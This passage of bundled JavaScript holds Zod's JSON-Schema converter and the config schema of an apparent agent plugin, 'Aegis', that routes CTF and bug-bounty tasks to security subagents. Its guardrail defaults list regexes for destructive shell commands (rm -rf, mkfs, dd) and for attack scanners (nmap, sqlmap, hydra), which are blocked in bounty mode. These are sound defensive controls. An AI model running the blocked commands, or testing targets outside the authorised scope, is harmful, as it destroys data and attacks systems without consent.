  "contains",
  "minContains",
  "maxContains",
  "minLength",
  "maxLength",
  "pattern",
  "format",
  "minimum",
  "maximum",
  "exclusiveMinimum",
  "exclusiveMaximum",
  "multipleOf",
  "description",
  "default",
  "contentEncoding",
  "contentMediaType",
  "contentSchema",
  "unevaluatedItems",
  "unevaluatedProperties",
  "if",
  "then",
  "else",
  "dependentSchemas",
  "dependentRequired",
  "nullable",
  "readOnly"
]);
function detectVersion(schema, defaultTarget) {
  const $schema = schema.$schema;
  if ($schema === "https://json-schema.org/draft/2020-12/schema") {
    return "draft-2020-12";
  }
  if ($schema === "http://json-schema.org/draft-07/schema#") {
    return "draft-7";
  }
  if ($schema === "http://json-schema.org/draft-04/schema#") {
    return "draft-4";
  }
  return defaultTarget ?? "draft-2020-12";
}
function resolveRef(ref, ctx) {
  if (!ref.startsWith("#")) {
    throw new Error("External $ref is not supported, only local refs (#/...) are allowed");
  }
  const path = ref.slice(1).split("/").filter(Boolean);
  if (path.length === 0) {
    return ctx.rootSchema;
  }
  const defsKey = ctx.version === "draft-2020-12" ? "$defs" : "definitions";
  if (path[0] === defsKey) {
    const key = path[1];
    if (!key || !ctx.defs[key]) {
      throw new Error(`Reference not found: ${ref}`);
    }
    return ctx.defs[key];
  }
  throw new Error(`Reference not found: ${ref}`);
}
function convertBaseSchema(schema, ctx) {
  if (schema.not !== undefined) {
    if (typeof schema.not === "object" && Object.keys(schema.not).length === 0) {
      return z.never();
    }
    throw new Error("not is not supported in Zod (except { not: {} } for never)");
  }
  if (schema.unevaluatedItems !== undefined) {
    throw new Error("unevaluatedItems is not supported");
  }
  if (schema.unevaluatedProperties !== undefined) {
    throw new Error("unevaluatedProperties is not supported");
  }
  if (schema.if !== undefined || schema.then !== undefined || schema.else !== undefined) {
    throw new Error("Conditional schemas (if/then/else) are not supported");
  }
  if (schema.dependentSchemas !== undefined || schema.dependentRequired !== undefined) {
    throw new Error("dependentSchemas and dependentRequired are not supported");
  }
  if (schema.$ref) {
    const refPath = schema.$ref;
    if (ctx.refs.has(refPath)) {
      return ctx.refs.get(refPath);
    }
    if (ctx.processing.has(refPath)) {
      return z.lazy(() => {
        if (!ctx.refs.has(refPath)) {
          throw new Error(`Circular reference not resolved: ${refPath}`);
        }
        return ctx.refs.get(refPath);
      });
    }
    ctx.processing.add(refPath);
    const resolved = resolveRef(refPath, ctx);
    const zodSchema2 = convertSchema(resolved, ctx);
    ctx.refs.set(refPath, zodSchema2);
    ctx.processing.delete(refPath);
    return zodSchema2;
  }
  if (schema.enum !== undefined) {
    const enumValues = schema.enum;
    if (ctx.version === "openapi-3.0" && schema.nullable === true && enumValues.length === 1 && enumValues[0] === null) {
      return z.null();
    }
    if (enumValues.length === 0) {
      return z.never();
    }
    if (enumValues.length === 1) {
      return z.literal(enumValues[0]);
    }
    if (enumValues.every((v) => typeof v === "string")) {
      return z.enum(enumValues);
    }
    const literalSchemas = enumValues.map((v) => z.literal(v));
    if (literalSchemas.length < 2) {
      return literalSchemas[0];
    }
    return z.union([literalSchemas[0], literalSchemas[1], ...literalSchemas.slice(2)]);
  }
  if (schema.const !== undefined) {
    return z.literal(schema.const);
  }
  const type = schema.type;
  if (Array.isArray(type)) {
    const typeSchemas = type.map((t) => {
      const typeSchema = { ...schema, type: t };
      return convertBaseSchema(typeSchema, ctx);
    });
    if (typeSchemas.length === 0) {
      return z.never();
    }
    if (typeSchemas.length === 1) {
      return typeSchemas[0];
    }
    return z.union(typeSchemas);
  }
  if (!type) {
    return z.any();
  }
  let zodSchema;
  switch (type) {
    case "string": {
      let stringSchema = z.string();
      if (schema.format) {
        const format = schema.format;
        if (format === "email") {
          stringSchema = stringSchema.check(z.email());
        } else if (format === "uri" || format === "uri-reference") {
          stringSchema = stringSchema.check(z.url());
        } else if (format === "uuid" || format === "guid") {
          stringSchema = stringSchema.check(z.uuid());
        } else if (format === "date-time") {
          stringSchema = stringSchema.check(z.iso.datetime());
        } else if (format === "date") {
          stringSchema = stringSchema.check(z.iso.date());
        } else if (format === "time") {
          stringSchema = stringSchema.check(z.iso.time());
        } else if (format === "duration") {
          stringSchema = stringSchema.check(z.iso.duration());
        } else if (format === "ipv4") {
          stringSchema = stringSchema.check(z.ipv4());
        } else if (format === "ipv6") {
          stringSchema = stringSchema.check(z.ipv6());
        } else if (format === "mac") {
          stringSchema = stringSchema.check(z.mac());
        } else if (format === "cidr") {
          stringSchema = stringSchema.check(z.cidrv4());
        } else if (format === "cidr-v6") {
          stringSchema = stringSchema.check(z.cidrv6());
        } else if (format === "base64") {
          stringSchema = stringSchema.check(z.base64());
        } else if (format === "base64url") {
          stringSchema = stringSchema.check(z.base64url());
        } else if (format === "e164") {
          stringSchema = stringSchema.check(z.e164());
        } else if (format === "jwt") {
          stringSchema = stringSchema.check(z.jwt());
        } else if (format === "emoji") {
          stringSchema = stringSchema.check(z.emoji());
        } else if (format === "nanoid") {
          stringSchema = stringSchema.check(z.nanoid());
        } else if (format === "cuid") {
          stringSchema = stringSchema.check(z.cuid());
        } else if (format === "cuid2") {
          stringSchema = stringSchema.check(z.cuid2());
        } else if (format === "ulid") {
          stringSchema = stringSchema.check(z.ulid());
        } else if (format === "xid") {
          stringSchema = stringSchema.check(z.xid());
        } else if (format === "ksuid") {
          stringSchema = stringSchema.check(z.ksuid());
        }
      }
      if (typeof schema.minLength === "number") {
        stringSchema = stringSchema.min(schema.minLength);
      }
      if (typeof schema.maxLength === "number") {
        stringSchema = stringSchema.max(schema.maxLength);
      }
      if (schema.pattern) {
        stringSchema = stringSchema.regex(new RegExp(schema.pattern));
      }
      zodSchema = stringSchema;
      break;
    }
    case "number":
    case "integer": {
      let numberSchema = type === "integer" ? z.number().int() : z.number();
      if (typeof schema.minimum === "number") {
        numberSchema = numberSchema.min(schema.minimum);
      }
      if (typeof schema.maximum === "number") {
        numberSchema = numberSchema.max(schema.maximum);
      }
      if (typeof schema.exclusiveMinimum === "number") {
        numberSchema = numberSchema.gt(schema.exclusiveMinimum);
      } else if (schema.exclusiveMinimum === true && typeof schema.minimum === "number") {
        numberSchema = numberSchema.gt(schema.minimum);
      }
      if (typeof schema.exclusiveMaximum === "number") {
        numberSchema = numberSchema.lt(schema.exclusiveMaximum);
      } else if (schema.exclusiveMaximum === true && typeof schema.maximum === "number") {
        numberSchema = numberSchema.lt(schema.maximum);
      }
      if (typeof schema.multipleOf === "number") {
        numberSchema = numberSchema.multipleOf(schema.multipleOf);
      }
      zodSchema = numberSchema;
      break;
    }
    case "boolean": {
      zodSchema = z.boolean();
      break;
    }
    case "null": {
      zodSchema = z.null();
      break;
    }
    case "object": {
      const shape = {};
      const properties = schema.properties || {};
      const requiredSet = new Set(schema.required || []);
      for (const [key, propSchema] of Object.entries(properties)) {
        const propZodSchema = convertSchema(propSchema, ctx);
        shape[key] = requiredSet.has(key) ? propZodSchema : propZodSchema.optional();
      }
      if (schema.propertyNames) {
        const keySchema = convertSchema(schema.propertyNames, ctx);
        const valueSchema = schema.additionalProperties && typeof schema.additionalProperties === "object" ? convertSchema(schema.additionalProperties, ctx) : z.any();
        if (Object.keys(shape).length === 0) {
          zodSchema = z.record(keySchema, valueSchema);
          break;
        }
        const objectSchema2 = z.object(shape).passthrough();
        const recordSchema = z.looseRecord(keySchema, valueSchema);
        zodSchema = z.intersection(objectSchema2, recordSchema);
        break;
      }
      if (schema.patternProperties) {
        const patternProps = schema.patternProperties;
        const patternKeys = Object.keys(patternProps);
        const looseRecords = [];
        for (const pattern of patternKeys) {
          const patternValue = convertSchema(patternProps[pattern], ctx);
          const keySchema = z.string().regex(new RegExp(pattern));
          looseRecords.push(z.looseRecord(keySchema, patternValue));
        }
        const schemasToIntersect = [];
        if (Object.keys(shape).length > 0) {
          schemasToIntersect.push(z.object(shape).passthrough());
        }
        schemasToIntersect.push(...looseRecords);
        if (schemasToIntersect.length === 0) {
          zodSchema = z.object({}).passthrough();
        } else if (schemasToIntersect.length === 1) {
          zodSchema = schemasToIntersect[0];
        } else {
          let result = z.intersection(schemasToIntersect[0], schemasToIntersect[1]);
          for (let i = 2;i < schemasToIntersect.length; i++) {
            result = z.intersection(result, schemasToIntersect[i]);
          }
          zodSchema = result;
        }
        break;
      }
      const objectSchema = z.object(shape);
      if (schema.additionalProperties === false) {
        zodSchema = objectSchema.strict();
      } else if (typeof schema.additionalProperties === "object") {
        zodSchema = objectSchema.catchall(convertSchema(schema.additionalProperties, ctx));
      } else {
        zodSchema = objectSchema.passthrough();
      }
      break;
    }
    case "array": {
      const prefixItems = schema.prefixItems;
      const items = schema.items;
      if (prefixItems && Array.isArray(prefixItems)) {
        const tupleItems = prefixItems.map((item) => convertSchema(item, ctx));
        const rest = items && typeof items === "object" && !Array.isArray(items) ? convertSchema(items, ctx) : undefined;
        if (rest) {
          zodSchema = z.tuple(tupleItems).rest(rest);
        } else {
          zodSchema = z.tuple(tupleItems);
        }
        if (typeof schema.minItems === "number") {
          zodSchema = zodSchema.check(z.minLength(schema.minItems));
        }
        if (typeof schema.maxItems === "number") {
          zodSchema = zodSchema.check(z.maxLength(schema.maxItems));
        }
      } else if (Array.isArray(items)) {
        const tupleItems = items.map((item) => convertSchema(item, ctx));
        const rest = schema.additionalItems && typeof schema.additionalItems === "object" ? convertSchema(schema.additionalItems, ctx) : undefined;
        if (rest) {
          zodSchema = z.tuple(tupleItems).rest(rest);
        } else {
          zodSchema = z.tuple(tupleItems);
        }
        if (typeof schema.minItems === "number") {
          zodSchema = zodSchema.check(z.minLength(schema.minItems));
        }
        if (typeof schema.maxItems === "number") {
          zodSchema = zodSchema.check(z.maxLength(schema.maxItems));
        }
      } else if (items !== undefined) {
        const element = convertSchema(items, ctx);
        let arraySchema = z.array(element);
        if (typeof schema.minItems === "number") {
          arraySchema = arraySchema.min(schema.minItems);
        }
        if (typeof schema.maxItems === "number") {
          arraySchema = arraySchema.max(schema.maxItems);
        }
        zodSchema = arraySchema;
      } else {
        zodSchema = z.array(z.any());
      }
      break;
    }
    default:
      throw new Error(`Unsupported type: ${type}`);
  }
  if (schema.description) {
    zodSchema = zodSchema.describe(schema.description);
  }
  if (schema.default !== undefined) {
    zodSchema = zodSchema.default(schema.default);
  }
  return zodSchema;
}
function convertSchema(schema, ctx) {
  if (typeof schema === "boolean") {
    return schema ? z.any() : z.never();
  }
  let baseSchema = convertBaseSchema(schema, ctx);
  const hasExplicitType = schema.type || schema.enum !== undefined || schema.const !== undefined;
  if (schema.anyOf && Array.isArray(schema.anyOf)) {
    const options = schema.anyOf.map((s) => convertSchema(s, ctx));
    const anyOfUnion = z.union(options);
    baseSchema = hasExplicitType ? z.intersection(baseSchema, anyOfUnion) : anyOfUnion;
  }
  if (schema.oneOf && Array.isArray(schema.oneOf)) {
    const options = schema.oneOf.map((s) => convertSchema(s, ctx));
    const oneOfUnion = z.xor(options);
    baseSchema = hasExplicitType ? z.intersection(baseSchema, oneOfUnion) : oneOfUnion;
  }
  if (schema.allOf && Array.isArray(schema.allOf)) {
    if (schema.allOf.length === 0) {
      baseSchema = hasExplicitType ? baseSchema : z.any();
    } else {
      let result = hasExplicitType ? baseSchema : convertSchema(schema.allOf[0], ctx);
      const startIdx = hasExplicitType ? 0 : 1;
      for (let i = startIdx;i < schema.allOf.length; i++) {
        result = z.intersection(result, convertSchema(schema.allOf[i], ctx));
      }
      baseSchema = result;
    }
  }
  if (schema.nullable === true && ctx.version === "openapi-3.0") {
    baseSchema = z.nullable(baseSchema);
  }
  if (schema.readOnly === true) {
    baseSchema = z.readonly(baseSchema);
  }
  const extraMeta = {};
  const coreMetadataKeys = ["$id", "id", "$comment", "$anchor", "$vocabulary", "$dynamicRef", "$dynamicAnchor"];
  for (const key of coreMetadataKeys) {
    if (key in schema) {
      extraMeta[key] = schema[key];
    }
  }
  const contentMetadataKeys = ["contentEncoding", "contentMediaType", "contentSchema"];
  for (const key of contentMetadataKeys) {
    if (key in schema) {
      extraMeta[key] = schema[key];
    }
  }
  for (const key of Object.keys(schema)) {
    if (!RECOGNIZED_KEYS.has(key)) {
      extraMeta[key] = schema[key];
    }
  }
  if (Object.keys(extraMeta).length > 0) {
    ctx.registry.add(baseSchema, extraMeta);
  }
  return baseSchema;
}
function fromJSONSchema(schema, params) {
  if (typeof schema === "boolean") {
    return schema ? z.any() : z.never();
  }
  const version2 = detectVersion(schema, params?.defaultTarget);
  const defs = schema.$defs || schema.definitions || {};
  const ctx = {
    version: version2,
    defs,
    refs: new Map,
    processing: new Set,
    rootSchema: schema,
    registry: params?.registry ?? globalRegistry
  };
  return convertSchema(schema, ctx);
}
// node_modules/zod/v4/classic/coerce.js
var exports_coerce = {};
__export(exports_coerce, {
  string: () => string3,
  number: () => number3,
  date: () => date4,
  boolean: () => boolean3,
  bigint: () => bigint3
});
function string3(params) {
  return _coercedString(ZodString, params);
}
function number3(params) {
  return _coercedNumber(ZodNumber, params);
}
function boolean3(params) {
  return _coercedBoolean(ZodBoolean, params);
}
function bigint3(params) {
  return _coercedBigint(ZodBigInt, params);
}
function date4(params) {
  return _coercedDate(ZodDate, params);
}

// node_modules/zod/v4/classic/external.js
config(en_default());
// src/mcp/types.ts
var BuiltinMcpNameSchema = exports_external.enum(["context7", "grep_app", "websearch", "memory", "sequential_thinking"]);
var AnyMcpNameSchema = exports_external.string().min(1);

// src/config/schema.ts
var DEFAULT_ROUTING = {
  ctf: {
    scan: {
      WEB_API: "ctf-web",
      WEB3: "ctf-web3",
      PWN: "ctf-pwn",
      REV: "ctf-rev",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-explore",
      UNKNOWN: "ctf-explore"
    },
    plan: {
      WEB_API: "aegis-plan",
      WEB3: "aegis-plan",
      PWN: "aegis-plan",
      REV: "aegis-plan",
      CRYPTO: "aegis-plan",
      FORENSICS: "aegis-plan",
      MISC: "aegis-plan",
      UNKNOWN: "aegis-plan"
    },
    execute: {
      WEB_API: "aegis-exec",
      WEB3: "aegis-exec",
      PWN: "aegis-exec",
      REV: "aegis-exec",
      CRYPTO: "aegis-exec",
      FORENSICS: "aegis-exec",
      MISC: "aegis-exec",
      UNKNOWN: "aegis-exec"
    },
    stuck: {
      WEB_API: "ctf-research",
      WEB3: "ctf-research",
      PWN: "aegis-deep",
      REV: "aegis-deep",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-hypothesis",
      UNKNOWN: "ctf-hypothesis"
    },
    failover: {
      WEB_API: "ctf-research",
      WEB3: "ctf-research",
      PWN: "ctf-pwn",
      REV: "ctf-rev",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-hypothesis",
      UNKNOWN: "ctf-hypothesis"
    }
  },
  bounty: {
    scan: {
      WEB_API: "bounty-triage",
      WEB3: "bounty-triage",
      PWN: "bounty-triage",
      REV: "bounty-triage",
      CRYPTO: "bounty-triage",
      FORENSICS: "bounty-triage",
      MISC: "bounty-triage",
      UNKNOWN: "bounty-triage"
    },
    plan: {
      WEB_API: "aegis-plan",
      WEB3: "aegis-plan",
      PWN: "aegis-plan",
      REV: "aegis-plan",
      CRYPTO: "aegis-plan",
      FORENSICS: "aegis-plan",
      MISC: "aegis-plan",
      UNKNOWN: "aegis-plan"
    },
    execute: {
      WEB_API: "aegis-exec",
      WEB3: "aegis-exec",
      PWN: "aegis-exec",
      REV: "aegis-exec",
      CRYPTO: "aegis-exec",
      FORENSICS: "aegis-exec",
      MISC: "aegis-exec",
      UNKNOWN: "aegis-exec"
    },
    stuck: {
      WEB_API: "bounty-research",
      WEB3: "bounty-research",
      PWN: "bounty-triage",
      REV: "bounty-triage",
      CRYPTO: "bounty-research",
      FORENSICS: "bounty-triage",
      MISC: "bounty-research",
      UNKNOWN: "bounty-research"
    },
    failover: {
      WEB_API: "bounty-research",
      WEB3: "bounty-research",
      PWN: "bounty-scope",
      REV: "bounty-scope",
      CRYPTO: "bounty-research",
      FORENSICS: "bounty-scope",
      MISC: "bounty-research",
      UNKNOWN: "bounty-research"
    }
  }
};
var DEFAULT_CAPABILITY_PROFILES = {
  ctf: {
    WEB_API: { required_subagents: ["ctf-web", "ctf-research", "ctf-verify"] },
    WEB3: { required_subagents: ["ctf-web3", "ctf-research", "ctf-verify"] },
    PWN: { required_subagents: ["ctf-pwn", "ctf-solve"] },
    REV: { required_subagents: ["ctf-rev", "ctf-solve"] },
    CRYPTO: { required_subagents: ["ctf-crypto", "ctf-solve"] },
    FORENSICS: { required_subagents: ["ctf-forensics", "ctf-solve"] },
    MISC: { required_subagents: ["ctf-explore", "ctf-solve"] },
    UNKNOWN: { required_subagents: ["ctf-explore", "ctf-solve"] }
  },
  bounty: {
    WEB_API: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    WEB3: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    PWN: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    REV: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    CRYPTO: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    FORENSICS: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    MISC: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    UNKNOWN: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] }
  }
};
var DEFAULT_SKILL_AUTOLOAD = {
  enabled: true,
  max_skills: 2,
  ctf: {
    scan: {
      WEB_API: ["top-web-vulnerabilities"],
      WEB3: ["ctf-solver"],
      PWN: ["ctf-solver"],
      REV: ["ctf-solver"],
      CRYPTO: ["ctf-solver"],
      FORENSICS: ["ctf-solver"],
      MISC: ["ctf-solver"],
      UNKNOWN: ["ctf-solver"]
    },
    plan: {
      WEB_API: ["plan-writing"],
      WEB3: ["plan-writing"],
      PWN: ["plan-writing"],
      REV: ["plan-writing"],
      CRYPTO: ["plan-writing"],
      FORENSICS: ["plan-writing"],
      MISC: ["plan-writing"],
      UNKNOWN: ["plan-writing"]
    },
    execute: {
      WEB_API: ["idor-testing", "systematic-debugging"],
      WEB3: ["systematic-debugging"],
      PWN: ["systematic-debugging"],
      REV: ["systematic-debugging"],
      CRYPTO: ["systematic-debugging"],
      FORENSICS: ["systematic-debugging"],
      MISC: ["systematic-debugging"],
      UNKNOWN: ["systematic-debugging"]
    }
  },
  bounty: {
    scan: {
      WEB_API: ["top-web-vulnerabilities"],
      WEB3: ["ethical-hacking-methodology"],
      PWN: ["ethical-hacking-methodology"],
      REV: ["ethical-hacking-methodology"],
      CRYPTO: ["ethical-hacking-methodology"],
      FORENSICS: ["ethical-hacking-methodology"],
      MISC: ["ethical-hacking-methodology"],
      UNKNOWN: ["ethical-hacking-methodology"]
    },
    plan: {
      WEB_API: ["plan-writing"],
      WEB3: ["plan-writing"],
      PWN: ["plan-writing"],
      REV: ["plan-writing"],
      CRYPTO: ["plan-writing"],
      FORENSICS: ["plan-writing"],
      MISC: ["plan-writing"],
      UNKNOWN: ["plan-writing"]
    },
    execute: {
      WEB_API: ["vulnerability-scanner"],
      WEB3: ["vulnerability-scanner"],
      PWN: ["vulnerability-scanner"],
      REV: ["vulnerability-scanner"],
      CRYPTO: ["vulnerability-scanner"],
      FORENSICS: ["vulnerability-scanner"],
      MISC: ["vulnerability-scanner"],
      UNKNOWN: ["vulnerability-scanner"]
    }
  },
  by_subagent: {
    "aegis-plan": ["ctf-workflow"],
    "aegis-exec": ["ctf-workflow"],
    "bounty-scope": ["bounty-workflow"],
    "ctf-rev": ["rev-analysis"],
    "ctf-pwn": ["pwn-exploit"]
  }
};
var GuardrailsSchema = exports_external.object({
  deny_destructive_bash: exports_external.boolean().default(true),
  destructive_command_patterns: exports_external.array(exports_external.string()).default([
    "\\brm\\s+-rf\\b",
    "\\bmkfs\\b",
    "\\bdd\\s+if=",
    "\\bshutdown\\b",
    "\\breboot\\b",
    "\\bpoweroff\\b",
    "\\bchown\\s+-R\\b",
    "\\bchmod\\s+777\\b",
    "\\bgit\\s+reset\\s+--hard\\b",
    "\\bgit\\s+clean\\s+-fdx\\b"
  ]),
  bounty_scope_readonly_patterns: exports_external.array(exports_external.string()).default([
    "^ls(\\s|$)",
    "^pwd(\\s|$)",
    "^whoami(\\s|$)",
    "^id(\\s|$)",
    "^uname(\\s|$)",
    "^cat(\\s|$)",
    "^head(\\s|$)",
    "^tail(\\s|$)",
    "^grep(\\s|$)",
    "^rg(\\s|$)",
    "^find(\\s|$)",
    "^readelf(\\s|$)",
    "^objdump(\\s|$)",
    "^strings(\\s|$)",
    "^xxd(\\s|$)",
    "^hexdump(\\s|$)",
    "^file(\\s|$)",
    "^sha256sum(\\s|$)"
  ])
});
var VerificationSchema = exports_external.object({
  verifier_tool_names: exports_external.array(exports_external.string()).default(["task", "bash", "pwno_run_command", "pwno_pwncli"]),
  verifier_title_markers: exports_external.array(exports_external.string()).default([
    "ctf-verify",
    "checker",
    "validator",
    "submission",
    "judge",
    "scoreboard"
  ])
});
var SkillListSchema = exports_external.array(exports_external.string()).default([]);
var TargetSkillMapSchema = exports_external.object({
  WEB_API: SkillListSchema,
  WEB3: SkillListSchema,
  PWN: SkillListSchema,
  REV: SkillListSchema,
  CRYPTO: SkillListSchema,
  FORENSICS: SkillListSchema,
  MISC: SkillListSchema,
  UNKNOWN: SkillListSchema
});
var SkillAutoloadModeSchema = exports_external.object({
  scan: TargetSkillMapSchema,
  plan: TargetSkillMapSchema,
  execute: TargetSkillMapSchema
});
var SkillAutoloadSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_skills: exports_external.number().int().positive().default(2),
  ctf: SkillAutoloadModeSchema.default(DEFAULT_SKILL_AUTOLOAD.ctf),
  bounty: SkillAutoloadModeSchema.default(DEFAULT_SKILL_AUTOLOAD.bounty),
  by_subagent: exports_external.record(exports_external.string(), exports_external.array(exports_external.string())).default({})
}).default(DEFAULT_SKILL_AUTOLOAD);
var MarkdownBudgetSchema = exports_external.object({
  worklog_lines: exports_external.number().int().positive().default(300),
  worklog_bytes: exports_external.number().int().positive().default(24 * 1024),
  evidence_lines: exports_external.number().int().positive().default(250),
  evidence_bytes: exports_external.number().int().positive().default(20 * 1024),
  scan_lines: exports_external.number().int().positive().default(200),
  scan_bytes: exports_external.number().int().positive().default(16 * 1024),
  context_pack_lines: exports_external.number().int().positive().default(80),
  context_pack_bytes: exports_external.number().int().positive().default(8 * 1024)
});
var FailoverSchema = exports_external.object({
  signatures: exports_external.array(exports_external.string()).default([
    "context_length_exceeded",
    "invalid_request_error",
    "timeout",
    "timed out",
    "etimedout"
  ]),
  map: exports_external.object({
    explore: exports_external.string().default("explore-fallback"),
    librarian: exports_external.string().default("librarian-fallback"),
    oracle: exports_external.string().default("oracle-fallback")
  }).default({
    explore: "explore-fallback",
    librarian: "librarian-fallback",
    oracle: "oracle-fallback"
  })
});
var DynamicModelSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  health_cooldown_ms: exports_external.number().int().positive().default(300000),
  generate_variants: exports_external.boolean().default(true)
});
var BountyPolicySchema = exports_external.object({
  scope_doc_candidates: exports_external.array(exports_external.string()).default([
    ".Aegis/scope.md",
    ".opencode/bounty-scope.md",
    "BOUNTY_SCOPE.md",
    "SCOPE.md"
  ]),
  require_scope_doc: exports_external.boolean().default(false),
  enforce_allowed_hosts: exports_external.boolean().default(true),
  include_apex_for_wildcard_allow: exports_external.boolean().default(false),
  enforce_blackout_windows: exports_external.boolean().default(true),
  deny_scanner_commands: exports_external.boolean().default(true),
  scanner_command_patterns: exports_external.array(exports_external.string()).default([
    "\\bnmap\\b",
    "\\bmasscan\\b",
    "\\bnuclei\\b",
    "\\bffuf\\b",
    "\\bferoxbuster\\b",
    "\\bgobuster\\b",
    "\\bdirb\\b",
    "\\bwfuzz\\b",
    "\\bnikto\\b",
    "\\bsqlmap\\b",
    "\\bhydra\\b",
    "\\bpatator\\b",
    "\\bjohn\\b"
  ])
});
var AutoDispatchSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  preserve_user_category: exports_external.boolean().default(true),
  max_failover_retries: exports_external.number().int().positive().default(2),
  operational_feedback_enabled: exports_external.boolean().default(false),
  operational_feedback_consecutive_failures: exports_external.number().int().positive().default(2)
});
var ToolOutputTruncatorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  persist_mask_sensitive: exports_external.boolean().default(false),
  max_chars: exports_external.number().int().positive().default(30000),
  head_chars: exports_external.number().int().positive().default(12000),
  tail_chars: exports_external.number().int().positive().default(4000),
  per_tool_max_chars: exports_external.record(exports_external.string(), exports_external.number().int().positive()).default({})
}).default({
  enabled: true,
  persist_mask_sensitive: false,
  max_chars: 30000,
  head_chars: 12000,
  tail_chars: 4000,
  per_tool_max_chars: {
    bash: 20000,
    grep: 20000,
    task: 30000
  }
});
var ContextInjectionSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  inject_agents_md: exports_external.boolean().default(true),
  inject_readme_md: exports_external.boolean().default(true),
  max_files: exports_external.number().int().positive().default(6),
  max_chars_per_file: exports_external.number().int().positive().default(4000),
  max_total_chars: exports_external.number().int().positive().default(16000)
}).default({
  enabled: true,
  inject_agents_md: true,
  inject_readme_md: true,
  max_files: 6,
  max_chars_per_file: 4000,
  max_total_chars: 16000
});
var AutoLoopSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  only_when_ultrawork: exports_external.boolean().default(true),
  idle_delay_ms: exports_external.number().int().nonnegative().default(350),
  max_iterations: exports_external.number().int().positive().default(200),
  stop_on_verified: exports_external.boolean().default(true)
}).default({
  enabled: true,
  only_when_ultrawork: true,
  idle_delay_ms: 350,
  max_iterations: 200,
  stop_on_verified: true
});
var TargetDetectionSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  lock_after_first: exports_external.boolean().default(true),
  only_in_scan: exports_external.boolean().default(true)
}).default({
  enabled: true,
  lock_after_first: true,
  only_in_scan: true
});
var NotesSchema = exports_external.object({
  root_dir: exports_external.string().min(1).default(".Aegis")
}).default({
  root_dir: ".Aegis"
});
var CommentCheckerSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  only_in_bounty: exports_external.boolean().default(true),
  min_added_lines: exports_external.number().int().nonnegative().default(12),
  max_comment_ratio: exports_external.number().min(0).max(1).default(0.35),
  max_comment_lines: exports_external.number().int().nonnegative().default(25)
}).default({
  enabled: true,
  only_in_bounty: true,
  min_added_lines: 12,
  max_comment_ratio: 0.35,
  max_comment_lines: 25
});
var RulesInjectorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_files: exports_external.number().int().positive().default(6),
  max_chars_per_file: exports_external.number().int().positive().default(3000),
  max_total_chars: exports_external.number().int().positive().default(12000)
}).default({
  enabled: true,
  max_files: 6,
  max_chars_per_file: 3000,
  max_total_chars: 12000
});
var RecoverySchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  empty_message_sanitizer: exports_external.boolean().default(true),
  auto_compact_on_context_failure: exports_external.boolean().default(true),
  context_window_proactive_compaction: exports_external.boolean().default(true),
  context_window_proactive_threshold_ratio: exports_external.number().min(0.5).max(0.99).default(0.9),
  context_window_proactive_rearm_ratio: exports_external.number().min(0.3).max(0.95).default(0.75),
  edit_error_hint: exports_external.boolean().default(true),
  thinking_block_validator: exports_external.boolean().default(true),
  non_interactive_env: exports_external.boolean().default(true),
  session_recovery: exports_external.boolean().default(true),
  context_window_recovery: exports_external.boolean().default(true),
  context_window_recovery_cooldown_ms: exports_external.number().int().nonnegative().default(15000),
  context_window_recovery_max_attempts_per_session: exports_external.number().int().positive().default(6)
}).default({
  enabled: true,
  empty_message_sanitizer: true,
  auto_compact_on_context_failure: true,
  context_window_proactive_compaction: true,
  context_window_proactive_threshold_ratio: 0.9,
  context_window_proactive_rearm_ratio: 0.75,
  edit_error_hint: true,
  thinking_block_validator: true,
  non_interactive_env: true,
  session_recovery: true,
  context_window_recovery: true,
  context_window_recovery_cooldown_ms: 15000,
  context_window_recovery_max_attempts_per_session: 6
});
var InteractiveSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  enabled_in_ctf: exports_external.boolean().default(true)
}).default({
  enabled: false,
  enabled_in_ctf: true
});
var ParallelBountyScanSchema = exports_external.object({
  max_tracks: exports_external.number().int().min(1).max(5).default(3),
  triage_tracks: exports_external.number().int().min(0).max(5).default(2),
  research_tracks: exports_external.number().int().min(0).max(5).default(1),
  scope_recheck_tracks: exports_external.number().int().min(0).max(5).default(0)
}).default({
  max_tracks: 3,
  triage_tracks: 2,
  research_tracks: 1,
  scope_recheck_tracks: 0
});
var ParallelSchema = exports_external.object({
  queue_enabled: exports_external.boolean().default(true),
  max_concurrent_per_provider: exports_external.number().int().positive().default(2),
  provider_caps: exports_external.record(exports_external.string(), exports_external.number().int().positive()).default({}),
  auto_dispatch_scan: exports_external.boolean().default(false),
  auto_dispatch_hypothesis: exports_external.boolean().default(false),
  bounty_scan: ParallelBountyScanSchema
}).default({
  queue_enabled: true,
  max_concurrent_per_provider: 2,
  provider_caps: {},
  auto_dispatch_scan: false,
  auto_dispatch_hypothesis: false,
  bounty_scan: {
    max_tracks: 3,
    triage_tracks: 2,
    research_tracks: 1,
    scope_recheck_tracks: 0
  }
});
var MemorySchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  storage_dir: exports_external.string().min(1).default(".Aegis/memory")
}).default({
  enabled: true,
  storage_dir: ".Aegis/memory"
});
var SequentialThinkingSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  activate_phases: exports_external.array(exports_external.enum(["SCAN", "PLAN", "EXECUTE", "VERIFY", "SUBMIT"])).default(["PLAN", "VERIFY"]),
